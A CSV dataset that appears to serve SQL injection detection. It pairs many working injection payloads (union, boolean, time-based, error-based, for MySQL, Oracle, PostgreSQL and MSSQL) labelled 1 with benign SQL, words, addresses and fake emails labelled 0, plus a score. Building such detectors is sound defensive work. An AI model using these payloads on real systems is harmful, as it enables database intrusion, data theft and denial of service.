-6377' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'qcms' like 'qcms,1,1,1.0
"1%'   )    )    union all select null,null,null#",1,1,1.0
select curtime (  ) ;,0,0,0.0
calle soria 154 2a,0,0,0.0
schucrenberg-oheaney3@testdevelcidad.info,0,0,0.006527024015406931
"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select count ( everyone ) from color,0,0,0.0
10110,0,0,0.004468253314358248
"   select strike, last, teethfrom vegetable where parent  is not null",0,0,0.0
"1%' union all select null,null,null,null,null,null,null,null--",1,1,1.0
coca artero,0,0,0.004468253314358248
enjabonadura,0,0,0.004468253314358248
1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,1,1.0
"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,1,1,1.0
alfeo,0,0,0.004468253314358248
select gasoline,0,0,0.03250505488953901
%27 or 1  =  1,1,1,1.0
select fur ( s ) from classroom inner join,0,0,0.0
"1' in boolean mode  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
dolores ibarruri 75,0,0,0.0012045813123877282
select option_value from wp_options where option_name  =  '_site_transient_timeout_wp_wps_bg_image_sync_1_process_lock' limit 1,0,0,0.0
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1,1,1.0
select * from development order by load desc,0,0,0.0
50159319e,0,0,0.004468253314358248
bruscamente,0,0,0.004468253314358248
"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",1,1,1.0
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,1.0
"-4418"" or 6872  =  6872 and ""gbut""  =  ""gbut",1,1,0.98
select * from roof fetch first 3 rows only select top 50 percent * from apart,0,0,0.0
"insert into highest ( opinion, heavy, paragraph, party, ball, chance )  values  ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )  ",0,0,0.01
"-7544""   )    )    union all select 3808,3808,3808,3808--",1,1,1.0
palazuelos de eresma,0,0,0.0
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""prtf"" like ""prtf",1,1,1.0
"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",1,1,1.0
"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",1,1,1.0
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,1,1,0.99
select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,1,1,0.98
gatliff.charlton@eco-pro.jm,0,0,0.006527024015406931
"1""   )    )     )   union all select null,null,null,null,null,null#",1,1,1.0
grimm@madrid2012.nu,0,0,0.004468253314358248
kumushalieva@hiperbarcelona.ly,0,0,0.004468253314358248
 and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  table_name   )    )    from sys.all_tables   )    )    and 'i'  =  'i,1,1,1.0
select * from take where country not between 'deer' and 'military',0,0,0.0
-5918'  )   as olzc where 5992  =  5992 or 4390  =  9085,1,1,1.0
"1' in boolean mode  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  #",1,1,1.0
"   select them, control+ ', ' + slabs+ ' ' + upward+ ', ' + chosen as name  from everything",0,0,0.05
" select position ( ""a"" in customername )  from customers;",0,0,0.0
"-2373%""  )   or 9323  =  9323#",1,1,1.0
5.62626e+14,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'nhuk'  =  'nhuk",1,1,1.0
pelland,0,0,0.004468253314358248
select * from football,0,0,0.0
sabiela,0,0,0.004468253314358248
select top 3 * from practice,0,0,0.0
"  update everywhere set volume =  'moment', city =  'place' where several =  labor",0,0,0.0
"   select point, man, pinkfrom jungle where canal  is not null",0,0,0.0
"  select round ( 135.375, 2 ) ;",0,0,0.0
"-9861' union all select 5710,5710,5710,5710,5710--",1,1,1.0
select avg ( fastened ) from fighting select sum ( hay ) ,0,0,0.0
select * from smoke where silly = 'serve',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 179 )  order by meta_id asc",0,0,0.0
"-1597"" where 5933  =  5933 or 3038  =  3038",1,1,1.0
-2912'   )    )    order by 1--,1,1,1.0
cortegana,0,0,0.004468253314358248
bujaraloz,0,0,0.004468253314358248
select * from cannot fetch first 50 percent rows onlyselect top 3 * from itself,0,0,0.0
select top 3 * from printed select * from watch 3select * from believed,0,0,0.0
rowen,0,0,0.004468253314358248
3953,0,0,0.004468253314358248
"-2872  )   where 8797  =  8797 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from lower 3,0,0,0.0
rorke,0,0,0.004468253314358248
marcano giner,0,0,0.004468253314358248
select avg ( stream ) from reader select sum ( drink ) ,0,0,0.0
select * from business where price not between 10 and 20,0,0,0.0
"  select insert ( ""w3schools.com"", 1, 9, ""example"" ) ;",0,0,0.18
24n1e39,0,0,0.004468253314358248
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,1,1.0
select * from stuck where think = 'solid'  and city = 'tears',0,0,0.0
select * from brain where activity not like 'bush%',0,0,0.0
select top 3 * from nearer select * from visitor 3select * from purple,0,0,0.0
select * from yet where point not like 'breeze%',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28080 )  order by meta_id asc",0,0,0.0
select fewer ( s )  from life select throughout from ear,0,0,0.0
elysha,0,0,0.004468253314358248
5.67192e+14,0,0,0.0
select press from bear union all select finger from one order by central,0,0,0.0
teo,0,0,0.004468253314358248
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1,1.0
44394,0,0,0.004468253314358248
rapetto picabea,0,0,0.004468253314358248
terrassa,0,0,0.004468253314358248
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,1,1.0
"1%""  )   union all select null,null,null,null--",1,1,1.0
select * from silence 3 select * from dozen,0,0,0.0
select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1,1.0
"  select leaf,did from leave where creature = 'whole' union select nor, before from written",0,0,0.0
"1   )    )    as cdhd where 2958  =  2958 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"select customername, contactname, city from customers where country  =  'brazil'; drop view view_name ; drop view [brazil customers];",0,0,0.02
"   select cap, meal, hungry from captured where pony  is null",0,0,0.0
select diagram ( s from actual right join,0,0,0.0
select * from bend fetch first 50 percent rows only,0,0,0.0
select universe ( s )  from relationship left join,0,0,0.0
1 waitfor delay '0:0:5'-- nnnp,1,1,1.0
select * from fell where potatoes like '%screen%',0,0,0.0
"-1368   )    )    union all select 1310,1310,1310,1310,1310#",1,1,1.0
"insert into steady  ( kitchen, far, source )  values  ( 'bear', 'ride', 'provide' )  ",0,0,0.0
"1"" where 5927  =  5927",1,1,1.0
1'  )   as mzby where 6530  =  6530,1,1,1.0
"-1510'   )    )     )   union all select 8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",1,1,1.0
select * from accurate where camp between '1996-07-01' and '1996-07-31',0,0,0.0
1  )   as afmb where 8665  =  8665 order by 1#,1,1,0.99
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1,1,0.98
select * from line where map = 'connected' fetch first 3 rows only,0,0,0.0
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,1.0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",1,1,1.0
trastabilln,0,0,0.004468253314358248
borrachero muros,0,0,0.004468253314358248
" select * from turn order by offer, hat",0,0,0.0
"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",1,1,1.0
"1%""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""%""  =  """,1,1,1.0
villaturiel,0,0,0.004468253314358248
select * from depth where mountain = 'women' fetch first 3 rows only,0,0,0.0
select avoid ( s )  from room left join,0,0,0.0
ganoza,0,0,0.004468253314358248
select max (  column_name  )  from table_name where condition ;,0,0,0.0
maiga,0,0,0.004468253314358248
select avg ( describe ) from cat,0,0,0.0
select avg ( bone ) from bare select sum ( happily ) ,0,0,0.0
select baseball ( s )  from limited select safe ( s ) ,0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",1,1,1.0
"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",1,1,1.0
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
select these ( s )  from within union,0,0,0.0
select * from tea where captain not between 'just' and 'park',0,0,0.0
select * from cow where root = 'every' limit 3,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 416 )  order by meta_id asc",0,0,0.0
"   select enemy, pay+ ', ' + process+ ' ' + myself+ ', ' + hold as value  from stick",0,0,0.0
"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,1.0
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,1,1.0
update `wp_options` set `option_value`  =  '0' where `option_name`  =  'medium_large_size_h',0,0,0.0725
 update thread set tool = 'surprise'where fighting = 'clothes',0,0,0.0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1,1,1.0
select count ( distinct hardly )  from rabbit,0,0,0.0
1'+  (  select gkve where 1943  =  1943 waitfor delay '0:0:5'  )  +',1,1,0.98
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select avg ( army ) from build select sum ( running ) ,0,0,0.0
"1   )    )    as krzi where 8727  =  8727 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select top 50 percent * from popular,0,0,0.0
"-2920""   )    )    as zdgv where 9702  =  9702 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"   select composition, mostly+ ', ' + eaten+ ' ' + task+ ', ' + village as lose  from wall",0,0,0.0
" select * from express order by independent asc, love desc",0,0,0.0
from  ( select distinct sale from search ) ,0,0,0.0
" select * from usually order by game, nest",0,0,0.0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1,1,1.0
budd9,0,0,0.004468253314358248
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""vqpx"" like ""vqpx",1,1,1.0
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1,1,1.0
select distinct plan from widely,0,0,0.0
if  (  9770  =  9748  )   select 9770 else drop function zyuo--,1,1,1.0
"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1,1,1.0
"1'  )   as fyuh where 7608  =  7608 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",1,1,1.0
select * from church fetch first 50 percent rows only,0,0,0.0
peaflor,0,0,0.004468253314358248
pensosa,0,0,0.004468253314358248
select * from flame where men between since09/01/1996minute and teeth15/31/1996rocky,0,0,0.0
select count ( * )  as sail,0,0,0.0
"-2211"" or 2113  =  8885#",1,1,1.0
select * from son where leaf = 'open',0,0,0.0
select * from prepare where began not like 'flew%',0,0,0.0
dick,0,0,0.004468253314358248
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""nobt""  =  ""nobt",1,1,1.0
81568460h,0,0,0.004468253314358248
"c/ honduras, 139 7-a",0,0,0.0
"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1,1,1.0
"select wp_posts.id from wp_posts where 1 = 1 and wp_posts.post_type  =  'acf-field' and   (  (  wp_posts.post_status  =  'publish'  )  )   and wp_posts.post_name  =  'field_5fc54784b64dd' order by wp_posts.menu_order asc, wp_posts.post_title asc limit 0, 1",0,0,0.0
16417,0,0,0.004468253314358248
select nation from anywhere union all select difficulty from easy order by common,0,0,0.0
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1,1,1.0
tremewan,0,0,0.004468253314358248
"1"" where 8672  =  8672 union all select null,null#",1,1,1.0
azorin 35 1b,0,0,0.004468253314358248
select * from magnet where four like '%fat%',0,0,0.0
select * from bare where tomorrow between bent09/01/1996improve and clock15/31/1996musical,0,0,0.0
select top 50 percent * from surprise select * from bare fetch first 50 percent rows onlyselect top 3 * from deal,0,0,0.0
29716,0,0,0.004468253314358248
77711232m,0,0,0.004468253314358248
terraje,0,0,0.004468253314358248
"1'  )   as vlwh where 9403  =  9403 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
"insert into shelter  ( third, disease, dance )  values  ( 'cause', 'wrote', 'eight' )  ",0,0,0.0
select count ( those ) from provide,0,0,0.0
1 and sleep  (  5  )  -- ruuv,1,1,1.0
"insert into list  ( aid, pot, interior )  values  ( 'blood', 'surface', 'surrounded' )  ",0,0,0.0
1'  )   as svtm where 7627  =  7627 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,1,0.99
"1%""   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
select plane from require,0,0,0.0
"  select addtime ( ""09:34:21.000001"", ""2:10:5.000003"" ) ;",0,0,0.03
//*,1,1,0.7394146601828376
select * from article where lunch = 'upper',0,0,0.0
1'||  (  select 'glyc' from dual where 4058  =  4058,1,1,1.0
select min ( symbol )  as while from hurried,0,0,0.0
"   select hunt,women,orange,bottom,where     (  (  depth join atmosphere on describe.correctly =  actually.copper )   inner join fasteron orders.eight =  ocean.loseid ) ",0,0,0.01
select * from sky where bar in  ( select asleep from balloon ) ,0,0,0.0
1%'   )    )     )   and 2006  =  2006,1,1,0.9900451374640952
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1,1,1.0
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",1,1,1.0
select count ( * )  as basket,0,0,0.0
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1,1.0
select top 3 * from drawn where feel = 'gulf' select * from six,0,0,0.0
"-6129 union all select 9122,9122#",1,1,1.0
22268,0,0,0.004468253314358248
select top 3 * from believed,0,0,0.0
6.14206e+15,0,0,0.0
"-1889%'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  '",1,1,1.0
"1%""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""%""  =  """,1,1,1.0
"  select subtime ( ""2017-06-15 10:24:21.000004"", ""3:2:5.000001"" ) ;",0,0,0.01
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1,1,0.9800572761985574
select * from jar where birds between 'medicine' and 'loud',0,0,0.0
"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",1,1,1.0
"1'+  (  select kqac where 4362  =  4362 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
rohan,0,0,0.004468253314358248
8en7dill3,0,0,0.004468253314358248
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""ilrk""  =  ""ilrk",1,1,1.0
"-1830""   )    )    as bptv where 4805  =  4805 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,1,1.0
select * from small where silly between 'term' and 'information',0,0,0.0
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1,0.98
"1%"" union all select null,null--",1,1,1.0
select * from movement order by cold desc,0,0,0.0
"-1439"" or 2849  =  8484 and ""pmdl""  =  ""pmdl",1,1,0.96
"1'+  (  select 'usoq' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'",1,1,1.0
select * from stop where to = 'congress' fetch first 3 rows only,0,0,0.0
lacey@bwds.mp,0,0,0.004468253314358248
select column_name from table1 left join table2 on table1.column_name  =  table2.column_name ;,0,0,0.0
"  select afterid as id, having as fruit from partly",0,0,0.02
"1""   )    )     )   union all select null,null,null,null#",1,1,1.0
select * from wet fetch first 50 percent rows only,0,0,0.0
select * from industry,0,0,0.0
"1%'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1,1,1.0
select top 3 * from kept select * from stove 3select * from blood,0,0,0.0
"  select without as settle, her as [mile]  from tip",0,0,0.0
en683$67,0,0,0.004182484772223606
select * from yet where slave = 'top',0,0,0.0
select * from nearly fetch first 3 rows only select top 50 percent * from fully,0,0,0.0
"quintana 19, 13f",0,0,0.004468253314358248
revesa,0,0,0.004468253314358248
select   (  case when   (  8711  =  6432  )   then 1 else 8711*  (  select 8711 from master..sysdatabases  )   end  )  --,1,1,1.0
"select * from mother where information between ""found"" and    ""water""",0,0,0.0
select sudden ( s )  from worry union,0,0,0.0
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""arqb"" like ""arqb",1,1,1.0
magnin_arne@tiebreak.com.sr,0,0,0.0
1  )   union all select null#,1,1,0.98
sarfati@weat.nc,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""rbqs""  =  ""rbqs",1,1,1.0
"1 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1,1,1.0
select * from positive fetch first 50 percent rows only,0,0,0.0
tors,0,0,0.004468253314358248
select * from fair where dirty = 'area' fetch first 3 rows only,0,0,0.0
select fallen from cell union select rock from actual order by everyone,0,0,0.0
"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",1,1,1.0
yamile de francisco,0,0,0.0
select * from let where read like '%magic%',0,0,0.0
1%'  )   or sleep  (  5  )   and   (  '%'  =  ',1,1,1.0
"  select arrangement,worse from soft where wrong = 'wet' union select rubbed, appearance from through",0,0,0.0
1'||  (  select 'sliy' where 9494  =  9494,1,1,1.0
"   select count ( won ) , push from guide by produce",0,0,0.0
delete from without,0,0,0.0
"select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--",1,1,1.0
"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
pladeval berganciano,0,0,0.004468253314358248
1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,1,1,1.0
13g0e7at42a,0,0,0.004468253314358248
"1%"" and sleep  (  5  )  #",1,1,1.0
select * from jump where garden between third09/01/1996boat and east15/31/1996plan,0,0,0.0
innes,0,0,0.004468253314358248
berja,0,0,0.004468253314358248
"  select grandmother,headed,element from bright left join orders on wear.areid =  birds.frame order by customs.musical",0,0,0.0
"  select slipped,hurt,along from path left join orders on represent.saveid =  each.per order by nature.frozen",0,0,0.01
select * from planned  where cabin = congress,0,0,0.0
-9389'  )   order by 1#,1,1,1.0
16435,0,0,0.004468253314358248
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1,1,1.0
23 or 1  =  1,1,1,1.0
select top 3 * from perhaps where coming = 'telephone' select * from nearest,0,0,0.0
"1' where 1602  =  1602 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,1,1.0
-4617'   )    )     )   or 9323  =  9323#,1,1,1.0
select * from never where settle not like 'organized%',0,0,0.0
"1   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   8294  =  8294",1,1,1.0
"1""  )   where 3250  =  3250 union all select null#",1,1,1.0
5.24225e+13,0,0,4.2417815482502655e-05
-8143  )   union all select 3014--,1,1,1.0
1'  )   as gxfu where 9676  =  9676,1,1,1.0
select * from union where wonderful not like 'horse%',0,0,0.12
from  ( select distinct return from call ) ,0,0,0.01
select avg ( price ) from detail,0,0,0.0
select * from day where not powerful = 'married'  and not stepped = 'plan',0,0,0.0
"  select * from rhyme where duck not in  ( 'damage', 'hurried', 'further' )  ",0,0,0.0
select potatoes ( s )  from exact full outer join,0,0,0.0
"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1,1,1.0
"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,1.0
"1""   )    )    as bosq where 4695  =  4695",1,1,1.0
"1""  )   as dgzf where 4834  =  4834",1,1,1.0
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1,1,1.0
"-8629 where 8049  =  8049 union all select 8049,8049,8049,8049,8049,8049,8049#",1,1,1.0
dasonmica,0,0,0.004468253314358248
99999464h,0,0,0.004468253314358248
select * from fur where habit between 'grown' and 'reason',0,0,0.0
"  select coffee,report,worried from combine left join orders on motion.armyid =  instance.driven order by last.composition",0,0,0.0
select * from throat order by cake desc,0,0,0.0
88280590n,0,0,0.004468253314358248
"   select identity, applied, laidfrom strip where mathematics  is not null",0,0,0.0
select * from coast where floor not like '[physical]%',0,0,0.0
"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
select * from population where ground between '1996-07-01' and '1996-07-31',0,0,0.0
select shape ( s )  from jet full outer join,0,0,0.0
select top 3 * from food where begun = 'careful' select * from milk,0,0,0.0
28670,0,0,0.004468253314358248
"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,1,1.0
"  select pow ( 8, 3 ) ;",0,0,0.0
select count ( spring ) from citizen,0,0,0.0
 (  2329  =  4209  )  *1,1,1,0.98
sauprobo,0,0,0.004468253314358248
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",1,1,1.0
07819871d,0,0,0.004468253314358248
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """,1,1,1.0
7.28868e+15,0,0,0.0
1  )   as wiyx where 6515  =  6515,1,1,1.0
hoeflich@movil-google.cx,0,0,0.006527024015406931
cotizada,0,0,0.004468253314358248
"ondulada, 121",0,0,0.004440982494135885
select * from ruler where master not like '[before]%',0,0,0.0
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1,1,1.0
1'  )   as hwpf where 5603  =  5603,1,1,1.0
select avg ( lay ) from pass,0,0,0.0
us,0,0,0.004468253314358248
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1,1,1.0
